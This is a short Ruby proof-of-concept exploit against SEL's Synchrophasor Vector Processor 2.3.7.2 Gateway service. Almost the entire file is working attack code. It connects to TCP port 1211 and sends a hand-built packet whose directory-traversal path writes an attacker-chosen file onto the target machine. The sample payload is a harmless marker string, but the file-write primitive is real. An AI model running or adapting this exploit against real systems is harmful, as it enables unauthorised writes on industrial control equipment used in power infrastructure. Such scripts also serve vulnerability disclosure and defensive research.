#!/usr/bin/env ruby

# https://selinc.com
# Synchrophasor Vector Processor Version 2.3.7.2 Exploit
# This poc just writes to '\'.
# ...mario ceballos

require 'rex'

host = ARGV[0]

def usage
  puts "[*] Synchrophasor Vector Processor Version 2.3.7.2/Gateway.exe"
  puts "[*] #{$0} <host>"
  exit
end

usage if ARGV.size < 1

begin
 sock = Rex::Socket::Tcp.create('PeerHost'  => host, 'PeerPort'  => 1211)

 data = "mario wuz here!!"

 req = "\xdd\xdd" + Rex::Text.rand_text_alpha_upper(12)
 req << "\x1c\x01\x00\x00" + "\x06\x00\x00\x00" # <- these are hardcoded
 req << "..\\..\\SEL-3378-POC1.txt"
 req << "\x00" * (220 + 17)
 req << [data.size].pack('V') + data

 sock.write(req) 
rescue => e
 puts "#{e.to_s}"
 exit
end
